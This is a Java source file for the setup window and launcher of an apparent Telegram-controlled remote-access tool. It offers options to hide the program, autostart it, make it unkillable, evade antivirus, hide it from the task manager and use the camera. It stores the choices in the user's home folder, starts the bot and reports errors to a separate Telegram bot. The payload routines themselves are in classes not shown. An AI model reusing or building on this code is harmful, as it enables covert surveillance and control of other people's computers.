package ProjectX;

import javafx.application.Application;
import javafx.application.Platform;
import javafx.embed.swing.JFXPanel;
import org.telegram.telegrambots.ApiContextInitializer;
import org.telegram.telegrambots.TelegramBotsApi;
import org.telegram.telegrambots.exceptions.TelegramApiRequestException;
import org.telegram.telegrambots.generics.BotSession;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.FocusAdapter;
import java.awt.event.FocusEvent;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

/**
 * Created by Alexander Ressl on 02.04.2017 13:19.
 */
public class BotCreate {
    private JButton createButton;
    private JPanel Back;
    private JCheckBox hiddenCheckBox;
    private JCheckBox autostartCheckBox;
    private JTextField telegramBotKeyTextField;
    private JCheckBox startUpNotificationCheckBox;
    private JTextField botNameTextField;
    private JCheckBox unkillableCheckBox;
    private JCheckBox antiAVCheckBox;
    private JCheckBox trollFunctionsCheckBox;
    private JCheckBox cameraCheckBox;
    private JCheckBox privateCheckBox;
    private JCheckBox taskHideCheckBox;
    private JCheckBox aliveCheckCheckBox;
    private JPasswordField passwordPasswordField;
    private JPasswordField passwordRepeatField;
    static JFrame frame = new JFrame("BotCreate");

    public BotCreate() {
        ApiContextInitializer.init();
        createButton.addActionListener(new ActionListener() {
            Config conf = BotCreate.read();
            Variables var = BotCreate.readVar();

            @Override
            public void actionPerformed(ActionEvent e) {
                char[] password = passwordPasswordField.getPassword();
                char[] repeat = passwordRepeatField.getPassword();
                String pw = new String(password);
                String rep = new String(repeat);
                if (telegramBotKeyTextField.getText().equals("bot token") || telegramBotKeyTextField.getText().length() < 10 || !telegramBotKeyTextField.getText().contains(":") || fail(telegramBotKeyTextField.getText())) {
                    JOptionPane.showMessageDialog(null, "Invald Telegramtoken!", "Error", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                if (!pw.equals(rep)) {
                    JOptionPane.showMessageDialog(null, "Passwords do not match!", "Error", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                conf = new Config(hiddenCheckBox.isSelected(), autostartCheckBox.isSelected(), startUpNotificationCheckBox.isSelected(), unkillableCheckBox.isSelected(),
                        antiAVCheckBox.isSelected(), trollFunctionsCheckBox.isSelected(), cameraCheckBox.isSelected(), privateCheckBox.isSelected(), taskHideCheckBox.isSelected(), aliveCheckCheckBox.isSelected(), telegramBotKeyTextField.getText(), botNameTextField.getText(), pw);
                frame.dispose();
                try {
                    System.out.println(conf.startupNotification);
                    GetAdmin.config = conf;
                    GetAdmin.los();
                } catch (Exception e1) {
                    e1.printStackTrace();
                }

            }
        });
        telegramBotKeyTextField.addFocusListener(new FocusAdapter() {
            @Override
            public void focusGained(FocusEvent e) {
                Config conf = BotCreate.read();
                Variables var = BotCreate.readVar();
                if (telegramBotKeyTextField.getText().equalsIgnoreCase("Bot Token")) {
                    if (conf != null && var.isReset())
                        telegramBotKeyTextField.setText(conf.getToken());
                    else
                        telegramBotKeyTextField.setText("");
                }
                super.focusGained(e);
            }
        });
        botNameTextField.addFocusListener(new FocusAdapter() {
            @Override
            public void focusGained(FocusEvent e) {
                if (botNameTextField.getText().equalsIgnoreCase("Bot Name")) {
                    botNameTextField.setText("");
                }
                super.focusGained(e);
            }
        });
        telegramBotKeyTextField.addFocusListener(new FocusAdapter() {
            @Override
            public void focusLost(FocusEvent e) {
                Config conf = BotCreate.read();
                Variables var = BotCreate.readVar();
                if (telegramBotKeyTextField.getText().equalsIgnoreCase("")) {
                    if (conf != null && var.isReset())
                        telegramBotKeyTextField.setText(conf.getToken());
                    else
                        telegramBotKeyTextField.setText("Bot Token");
                }
                super.focusLost(e);
            }
        });
        botNameTextField.addFocusListener(new FocusAdapter() {
            @Override
            public void focusLost(FocusEvent e) {
                if (botNameTextField.getText().equalsIgnoreCase("")) {
                    botNameTextField.setText("Bot Name");
                }
                super.focusLost(e);
            }
        });

    }

    public static void main(String[] args) throws InterruptedException, IOException, ClassNotFoundException {
        File conf = new File(System.getProperty("user.home") + "\\conf.bot");
        if (!conf.exists()) {
            frame.setContentPane(new BotCreate().Back);
            frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
            frame.pack();
            frame.setLocationRelativeTo(null);
            frame.setResizable(false);
            frame.setVisible(true);
        } else {
            Variables var = readVar();
            Config config = read();
            if (config != null)
                if (var.isReset()) {
                    frame.setContentPane(new BotCreate().Back);
                    frame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);
                    frame.pack();
                    frame.setLocationRelativeTo(null);
                    frame.setResizable(false);
                    frame.setVisible(true);
                } else {
                    ApiContextInitializer.init();
                    Bot bot = new Bot(args);
                    starten(bot);
                }
            else {
                try {
                    TelegramBotsApi telegramBotsApi = new TelegramBotsApi();
                    BotSession sup;
                    sup = telegramBotsApi.registerBot(new SupBot("Fehler:" + "\n" + "Config is null!"));
                    sup.close();
                } catch (Exception e) {

                }
            }

        }
    }

    static Config read() {
        Config back = null;
        try {
            FileInputStream fis = new FileInputStream(System.getProperty("user.home") + "\\conf.bot");
            ObjectInputStream ois = new ObjectInputStream(fis);
            back = (Config) ois.readObject();
            ois.close();
        } catch (Exception e) {
            try {
                TelegramBotsApi telegramBotsApi = new TelegramBotsApi();
                BotSession sup;
                sup = telegramBotsApi.registerBot(new SupBot("Fehler:" + "\n" + e.toString()));
                sup.close();
            } catch (Exception ex) {

            }
        }
        return back;
    }

    static Variables readVar() {
        Variables back = null;
        try {
            FileInputStream fis = new FileInputStream(System.getProperty("user.home") + "\\var.bot");
            ObjectInputStream ois = new ObjectInputStream(fis);
            back = (Variables) ois.readObject();
            ois.close();
        } catch (Exception e) {
            try {
                TelegramBotsApi telegramBotsApi = new TelegramBotsApi();
                BotSession sup;
                sup = telegramBotsApi.registerBot(new SupBot("Fehler:" + "\n" + e.toString()));
                sup.close();
            } catch (Exception ex) {

            }
        }
        if (back == null) {
            System.out.println("Jo ist es");
            back = new Variables();
        }
        return back;
    }

    private static void starten(Bot bot) throws InterruptedException {
        try {
            TelegramBotsApi telegramBotsApi = new TelegramBotsApi();
            telegramBotsApi.registerBot(bot);
        } catch (Exception e) {
            bot.setImage(3);
            Thread.sleep(5000);
            starten(bot);
            return;
        }
        bot.setImage(0);
    }

    boolean fail(String token) {
        BotSession bum = null;
        boolean fail = false;
        TelegramBotsApi telegramBotsApi = new TelegramBotsApi();
        try {
            bum = telegramBotsApi.registerBot(new DummyBot(token));
        } catch (TelegramApiRequestException e) {
            System.out.println(e);
            fail = true;
        }
        if (!fail)
            bum.stop();
        return fail;
    }
}
